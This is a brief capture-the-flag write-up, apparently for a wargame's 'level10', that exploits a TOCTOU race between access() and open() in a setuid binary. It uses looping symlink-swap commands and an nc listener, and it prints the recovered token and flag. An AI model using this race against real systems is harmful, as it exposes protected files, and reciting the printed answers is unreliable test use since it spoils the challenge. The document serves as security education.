1. run with ./level10 token we have: sends file to host if you have access to it
2. ./level10 token localhost we have: You don't have access to token
3. with strings level10 we know that they are listenning on the port 6969
4. with nm level10 we know this binary is using access and open for file access, with man we know 
  Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security
       hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this reason, the  use
       of this system call should be avoided.
5. create the create.sh for a symblink
6. since we wanna actions to happen all the time, we do a shell scripting with true
7. open 3 windows for that
 7.1 while true; do sh create.sh ; done
 7.2 while true; do ./level10 /tmp/link 127.0.0.1; done
 7.3 while true; do nc 127.0.0.1 -l 6969; done
8. we got a token woupa2yuojeeaaed06riuj63c  it's the pass for flag10
9. run getflag we have the token feulo4b72j7edeahuete3no7c
